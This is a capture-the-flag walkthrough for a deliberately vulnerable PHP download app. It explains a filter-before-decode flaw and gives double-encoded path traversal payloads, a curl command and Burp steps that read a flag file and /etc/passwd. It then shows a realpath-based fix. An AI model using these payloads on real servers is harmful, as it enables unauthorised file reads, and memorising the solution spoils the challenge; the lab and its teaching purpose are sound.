# Ziphaven — Solution / Walkthrough

> ⚠️ **Spoilers ahead.** Try the challenge yourself before reading.

## The vulnerability (level 5 — filter before decode)

`src/Download.php` guards the requested filename and then resolves it:

```php
// 1) reject literal traversal
if (str_contains($requested, '../') || str_contains($requested, '..\\')) {
    throw new \RuntimeException('Rejected: path traversal detected.');
}

// 2) "be lenient" and decode one more time
$decoded = urldecode($requested);

return $downloadsDir . '/' . $decoded;
```

The developer knows about path traversal and rejects any value that **already**
contains `../`. The fatal mistake is the **order of operations**: the guard runs
*first*, and only *afterwards* does the code `urldecode()` the value "one more
time". A percent-encoded `../` is invisible to a guard that only looked at the
still-encoded text.

Remember there are **two decode layers** in play:

```
browser / Burp sends   ?file=%252e%252e%252fflag.txt   (double-encoded)
PHP populates $_GET     => "%2e%2e%2fflag.txt"          (webserver peeled one layer)
guard sees              "%2e%2e%2f..."  -> no literal "../"  -> PASSES
extra urldecode()       => "../flag.txt"                 -> ESCAPES
join                    => downloads/../flag.txt
```

So you must encode the traversal **once more than usual**, so that after PHP's
own decode a *still-encoded* `../` survives the filter and the app's extra
`urldecode()` brings it back to life.

## Exploitation

Normal, intended request:

```
GET /download.php?file=ziphaven-sdk-2.9.0.zip
```

A plain `../` is rejected by the guard (HTTP 400):

```
GET /download.php?file=../flag.txt        -> 400 (guard won)
```

The bypass — double-encode the traversal so the guard sees `%2e%2e%2f`:

```
GET /download.php?file=%252e%252e%252fflag.txt   -> the flag
```

With `curl` (note `--path-as-is` and that we pass the **double-encoded** value
literally so it is not decoded by the client):

```bash
curl --path-as-is "http://localhost:8100/download.php?file=%252e%252e%252fflag.txt"
```

Expected output:

```
FLAG{ZIPHAVEN_UNZIPPED}
```

A single-encoded slash also works, because the literal `../` is still hidden
from the guard until the extra decode:

```
GET /download.php?file=..%252fflag.txt
```

### Going further

Chain it to climb further and read files outside the app:

```
GET /download.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

## Doing it in Burp Suite

1. Proxy your browser through Burp and open <http://localhost:8100>.
2. Click **Download** on any artefact and capture the request in
   **Proxy > HTTP history**.
3. Send it to **Repeater**.
4. Try `file=../flag.txt` — it is blocked (400). A filter is present.
5. Now encode the payload. Select `../` in the `file` value and use
   **Ctrl+U** to URL-encode it, then encode the result **once more** (encode
   the `%` signs too) to get `%252e%252e%252f`. Send it — the guard is bypassed
   and the flag comes back.

> Tip: Burp's **Decoder** is handy to build `%252e%252e%252f` step by step
> (encode `../` → `%2e%2e%2f`, then URL-encode again → `%252e%252e%252f`).

## The fix

Never inspect input *before* fully decoding it, and never rely on a blocklist
for path traversal. Decode first, then resolve the real path and verify it
stays inside the base directory:

```php
$decoded = rawurldecode($requested);          // decode ONCE, up front
$base = realpath($downloadsDir);
$full = realpath($downloadsDir . '/' . $decoded);

if ($full === false || !str_starts_with($full, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(403);
    return;
}
// safe to read $full
```

Better still: never accept raw filenames. Map an opaque id to a known file
server-side (an allow-list), so user input never touches the filesystem path.
